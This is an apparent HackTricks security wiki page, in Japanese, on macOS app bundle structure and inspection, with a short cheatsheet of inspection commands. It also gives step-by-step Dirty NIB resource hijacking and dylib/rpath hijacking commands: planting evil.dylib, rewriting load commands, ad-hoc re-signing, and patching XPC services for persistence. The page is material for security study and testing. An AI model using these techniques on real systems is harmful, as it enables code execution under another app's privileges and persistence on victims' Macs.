# macOS Bundles

{{#include ../../../banners/hacktricks-training.md}}

## 基本情報

macOSのBundlesは、アプリケーション、ライブラリ、その他の必要なファイルなど、さまざまなリソースをコンテナとして格納します。これにより、Finderでは、見慣れた`*.app`ファイルのような単一のオブジェクトとして表示されます。最も一般的に見られるBundleは`.app` Bundleですが、`.framework`、`.systemextension`、`.kext`などの種類も広く使用されています。

### Bundleの主要コンポーネント

Bundle内、特に`<application>.app/Contents/`ディレクトリには、さまざまな重要なリソースが格納されています。

- **\_CodeSignature**: このディレクトリには、アプリケーションの整合性を検証するために必要なcode-signingの詳細が格納されています。次のようなコマンドを使用して、code-signing情報を確認できます。
```bash
openssl dgst -binary -sha1 /Applications/Safari.app/Contents/Resources/Assets.car | openssl base64
```
- **MacOS**: ユーザー操作時に実行されるアプリケーションの実行バイナリを含みます。
- **Resources**: 画像、ドキュメント、インターフェースの説明（nib/xib ファイル）など、アプリケーションのユーザーインターフェースコンポーネントを格納します。
- **Info.plist**: アプリケーションのメイン設定ファイルとして機能し、システムがアプリケーションを適切に認識して操作するために重要です。

#### Info.plist の重要なキー

`Info.plist` ファイルはアプリケーション設定の基盤であり、次のようなキーが含まれます。

- **CFBundleExecutable**: `Contents/MacOS` ディレクトリにあるメイン実行ファイルの名前を指定します。
- **CFBundleIdentifier**: アプリケーションのグローバル識別子を提供します。macOS によるアプリケーション管理で広く使用されます。
- **LSMinimumSystemVersion**: アプリケーションの実行に必要な macOS の最小バージョンを示します。

### Bundles の調査

`Safari.app` などの bundle の内容を調査するには、次のコマンドを使用できます: `bash ls -lR /Applications/Safari.app/Contents`

この調査により、`_CodeSignature`、`MacOS`、`Resources` などのディレクトリや、`Info.plist` などのファイルが確認できます。これらは、アプリケーションの保護からユーザーインターフェースや動作パラメータの定義まで、それぞれ固有の役割を担います。

#### その他の Bundle ディレクトリ

一般的なディレクトリ以外にも、bundle には次のようなものが含まれる場合があります。

- **Frameworks**: アプリケーションが使用する同梱 Frameworks を含みます。Frameworks は追加のリソースを備えた dylib のようなものです。
- **PlugIns**: アプリケーションの機能を拡張する plug-in や extension 用のディレクトリです。
- **XPCServices**: アプリケーションがプロセス外通信に使用する XPC services を格納します。

この構造により、必要なすべてのコンポーネントが bundle 内にカプセル化され、モジュール性と安全性を備えたアプリケーション環境が実現します。

`Info.plist` のキーとその意味について詳しくは、Apple developer documentation に詳細なリソースがあります: [Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html)。

## Security Notes & Abuse Vectors

- **Gatekeeper / App Translocation**: quarantine された bundle が初めて実行されると、macOS は詳細な signature verification を実行し、ランダム化された translocated path から実行する場合があります。一度許可されると、以降の起動では簡易的なチェックのみが実行されます。`Resources/`、`PlugIns/`、nib などのリソースファイルは、これまで歴史的にチェックされていませんでした。macOS 13 Ventura 以降では初回実行時に詳細なチェックが強制され、新しい *App Management* TCC permission により、ユーザーの同意なしに third-party process が他の bundle を変更することが制限されます。ただし、古いシステムは引き続き脆弱です。
- **Bundle Identifier collisions**: 同じ `CFBundleIdentifier` を再利用する複数の embedded target（PlugIns、helper tools）は、signature validation を破壊し、場合によっては URL-scheme hijacking/confusion を可能にします。必ず sub-bundle を列挙し、ID が一意であることを確認してください。

## Resource Hijacking (Dirty NIB / NIB Injection)

Ventura より前は、signed app の UI resource を置き換えることで、shallow code signing を回避し、アプリケーションの entitlements を使用して code execution を実行できました。現在の research（2024）では、これは pre-Ventura および un-quarantined build で引き続き機能することが示されています:<sup>[1][2]</sup>

1. target app を writable location（例: `/tmp/Victim.app`）にコピーします。
2. `Contents/Resources/MainMenu.nib`（または `NSMainNibFile` で宣言された任意の nib）を、`NSAppleScript`、`NSTask` などを instantiate する malicious なものに置き換えます。
3. app を起動します。malicious な nib は victim の bundle ID と entitlements（TCC grants、microphone/camera など）で実行されます。
4. Ventura+ では、初回起動時に bundle の deep-verifying を行い、それ以降の変更には *App Management* permission を要求することで緩和されます。そのため persistence はより困難になりますが、古い macOS に対する initial-launch attack は依然として適用されます。<sup>[1]</sup>

最小限の malicious nib payload の例（xib を `ibtool` で nib に compile します）。
```bash
# create a nib that runs osascript -e 'do shell script "id"'
# ...build xib in Xcode, then
ibtool --compile MainMenu.nib MainMenu.xib
cp MainMenu.nib /tmp/Victim.app/Contents/Resources/
open /tmp/Victim.app
```
## Bundle 内での Framework / PlugIn / dylib Hijacking

`@rpath` の lookup では、Bundle 内の Frameworks が優先されるため、`Contents/Frameworks/` または `Contents/PlugIns/` 内に malicious library を配置すると、main binary が library validation なしで署名されている場合や、`LC_RPATH` の順序が弱い場合に load order を redirect できます。

unsigned/ad-hoc bundle を悪用する場合の一般的な手順:
```bash
cp evil.dylib /tmp/Victim.app/Contents/Frameworks/
install_name_tool -add_rpath @executable_path/../Frameworks /tmp/Victim.app/Contents/MacOS/Victim
# or patch an existing load command
install_name_tool -change @rpath/Legit.dylib @rpath/evil.dylib /tmp/Victim.app/Contents/MacOS/Victim
codesign -f -s - --timestamp=none /tmp/Victim.app/Contents/Frameworks/evil.dylib
codesign -f -s - --deep --timestamp=none /tmp/Victim.app
open /tmp/Victim.app
```
注記:
- `com.apple.security.cs.disable-library-validation` がない Hardened runtime は third-party dylibs をブロックするため、まず entitlements を確認する。
- `Contents/XPCServices/` 配下の XPC services は sibling frameworks をロードすることが多いため、persistence または privilege escalation paths のために、同様にそれらのバイナリを patch する。

## Quick Inspection Cheatsheet
```bash
# list top-level bundle metadata
/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" /Applications/App.app/Contents/Info.plist

# enumerate embedded bundles
find /Applications/App.app/Contents -name "*.app" -o -name "*.framework" -o -name "*.plugin" -o -name "*.xpc"

# verify code signature depth
codesign --verify --deep --strict /Applications/App.app && echo OK

# show rpaths and linked libs
otool -l /Applications/App.app/Contents/MacOS/App | grep -A2 RPATH
otool -L /Applications/App.app/Contents/MacOS/App
```
## 参考資料

- [1] [Bringing process injection into view(s): exploiting macOS apps using nib files (2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)
- [2] [Dirty NIB & bundle resource tampering write‑up (2024)](https://karol-mazurek.medium.com/snake-apple-app-bundle-ext-f5c43a3c84c4)

{{#include ../../../banners/hacktricks-training.md}}
